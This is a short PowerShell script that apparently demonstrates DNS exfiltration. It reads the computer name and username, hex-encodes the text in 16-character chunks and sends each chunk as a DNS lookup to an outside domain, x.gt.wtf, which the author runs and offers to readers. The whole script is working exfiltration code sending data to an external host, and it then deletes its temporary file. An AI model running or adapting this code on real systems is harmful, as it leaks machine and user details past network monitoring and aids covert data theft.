# sometimes I run my DNS server on x.gt.wtf - feel free to use it if it works, 
# or make your own DNS zone to play at your own. The zone name is hardcoded into the script below.

$samplefile = (New-TemporaryFile).FullName

$env:computername+" "+$env:USERNAME | Out-File $samplefile -NoNewline

([io.file]::ReadAllText($samplefile)) -split '(.{16})' | ? {$_} | % { Resolve-DnsName (([System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($_))).Replace('-','')+".x.gt.wtf") -Type A; Start-Sleep -Seconds 1 }

Remove-Item $samplefile
